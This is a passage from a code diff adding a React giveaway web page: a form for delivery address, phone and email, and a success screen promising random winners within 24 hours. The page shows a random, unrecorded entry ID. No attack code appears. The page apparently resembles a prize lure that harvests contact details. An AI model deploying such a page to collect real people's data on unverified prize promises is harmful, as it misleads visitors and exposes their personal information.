+          </div>
+          <div style={S.fg}>
+            <label style={S.lbl}>Delivery Address</label>
+            <textarea placeholder="Street, City, State, ZIP / Postal Code, Country" value={form.address} onChange={e=>setForm(f=>({...f,address:e.target.value}))} rows={3} style={{...S.inp, resize:"none", lineHeight:"1.5", ...(errors.address?S.inpErr:{})}}/>
+            {errors.address && <div style={S.err}>⚠ {errors.address}</div>}
+          </div>
+          <div style={S.fg}>
+            <label style={S.lbl}>Mobile Number</label>
+            <input type="tel" placeholder="+1 234 567 8900" value={form.mobile} onChange={e=>setForm(f=>({...f,mobile:e.target.value}))} style={{...S.inp,...(errors.mobile?S.inpErr:{})}}/>
+            {errors.mobile && <div style={S.err}>⚠ {errors.mobile}</div>}
+          </div>
+          <div style={S.fg}>
+            <label style={S.lbl}>Email Address</label>
+            <input type="email" placeholder="you@example.com" value={form.email} onChange={e=>setForm(f=>({...f,email:e.target.value}))} style={{...S.inp,...(errors.email?S.inpErr:{})}}/>
+            {errors.email && <div style={S.err}>⚠ {errors.email}</div>}
+          </div>
+          <div style={{background:"rgba(247,212,94,0.06)", borderRadius:"10px", padding:"12px 14px", marginBottom:"20px", fontSize:"12px", color:"rgba(255,255,255,0.45)", lineHeight:"1.5"}}>
+            🔒 Your data is kept private and used solely for prize delivery. 100 winners selected randomly within 24 hours.
+          </div>
+          <button style={{...S.btn, opacity:loading?0.7:1}} onClick={handleSubmit} disabled={loading}>
+            {loading?<span style={{display:"flex",alignItems:"center",justifyContent:"center",gap:"10px"}}><span style={S.spin}/>Submitting Entry...</span>:"🎯 Submit My Entry"}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+
+  if (step === "success") {
+    const confetti = Array.from({length:30},(_,i)=>({id:i,l:(i*13%100),w:(i*1.3%10)+5,bg:["#f7d45e","#ff6b9d","#00c864","#60a5fa","#f97316"][i%5],round:i%2===0,dur:(i*0.4%4)+3,del:(i*0.3%3)}));
+    return (
+      <div style={S.app}>
+        {confetti.map(c=>(
+          <div key={c.id} style={{position:"fixed",left:`${c.l}%`,top:"-20px",width:`${c.w}px`,height:`${c.w}px`,background:c.bg,borderRadius:c.round?"50%":"2px",animation:`confettiFall ${c.dur}s ease-in ${c.del}s forwards`,zIndex:10,pointerEvents:"none"}}/>
+        ))}
+        <FloatingParticles/>
+        <div style={{...S.cont, paddingTop:"60px", textAlign:"center"}}>
+          <div style={{fontSize:"80px", marginBottom:"24px", animation:"float 3s ease-in-out infinite", display:"inline-block", filter:"drop-shadow(0 0 30px rgba(247,212,94,0.6))"}}>🏆</div>
+          <h1 style={{fontSize:"clamp(28px,8vw,42px)", margin:"0 0 12px", ...S.gold, lineHeight:1.2}}>Congratulations!</h1>
+          <p style={{fontSize:"18px", color:"rgba(255,255,255,0.8)", marginBottom:"8px", lineHeight:1.5}}>You're officially in the draw! 🎉</p>
+          <p style={{color:"rgba(255,255,255,0.45)", fontSize:"14px", marginBottom:"32px"}}>Entry confirmed for <strong style={{color:"#f7d45e"}}>{form.fullName}</strong></p>
+          <div style={{...S.card, background:"rgba(0,200,100,0.08)", border:"1px solid rgba(0,200,100,0.3)", textAlign:"left", animation:"countUp 0.5s ease"}}>
+            <div style={{display:"flex", alignItems:"flex-start", gap:"16px"}}>
+              <div style={{width:"48px", height:"48px", borderRadius:"50%", background:"rgba(0,200,100,0.15)", display:"flex", alignItems:"center", justifyContent:"center", fontSize:"22px", flexShrink:0, animation:"pulseAnim 2s ease-in-out infinite"}}>✅</div>
+              <div>
+                <h3 style={{margin:"0 0 8px", color:"#00c864", fontSize:"16px"}}>You will be notified within 1 day</h3>
+                <p style={{margin:0, color:"rgba(255,255,255,0.5)", fontSize:"13px", lineHeight:1.6}}>We'll reach out to <strong style={{color:"rgba(255,255,255,0.8)"}}>{form.email}</strong> and <strong style={{color:"rgba(255,255,255,0.8)"}}>{form.mobile}</strong> if you're selected.</p>
+              </div>
+            </div>
+          </div>
+          <div style={S.card}>
+            <h3 style={{...S.gold, margin:"0 0 18px", fontSize:"16px", textAlign:"left"}}>📋 What Happens Next</h3>
+            {[{icon:"🎯",title:"Random Draw",desc:"100 winners selected from all valid entries worldwide"},{icon:"📧",title:"Notification",desc:"Winners contacted within 24 hours via email & SMS"},{icon:"🚚",title:"Prize Delivery",desc:"Your prize shipped to your provided address"}].map((s,i)=>(
+              <div key={i} style={{display:"flex", gap:"14px", alignItems:"flex-start", marginBottom:i<2?"16px":0, paddingBottom:i<2?"16px":0, borderBottom:i<2?"1px solid rgba(255,255,255,0.06)":"none"}}>
+                <span style={{fontSize:"22px", flexShrink:0}}>{s.icon}</span>
+                <div style={{textAlign:"left"}}>
+                  <div style={{fontWeight:"600", fontSize:"14px", marginBottom:"2px"}}>{s.title}</div>
+                  <div style={{color:"rgba(255,255,255,0.45)", fontSize:"13px"}}>{s.desc}</div>
+                </div>
+              </div>
+            ))}
+          </div>
+          <div style={{...S.card, background:"rgba(247,212,94,0.06)", border:"1px solid rgba(247,212,94,0.15)"}}>
+            <p style={{margin:"0 0 16px", color:"rgba(255,255,255,0.6)", fontSize:"14px"}}>🌟 Help spread the word and let your friends know!</p>
+            <button onClick={()=>setStep("landing")} style={{...S.btn, background:"transparent", border:"1px solid rgba(247,212,94,0.4)", color:"#f7d45e"}}>View Prize Pool Again</button>
+          </div>
+          <p style={{color:"rgba(255,255,255,0.2)", fontSize:"11px", marginTop:"20px", lineHeight:1.5}}>Good luck! · Entry ID: {Math.random().toString(36).substr(2,9).toUpperCase()}</p>
+        </div>
+      </div>
+    );
+  }
+}
+
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(<GiveawayApp />);
+</script>
+</body>
+</html>
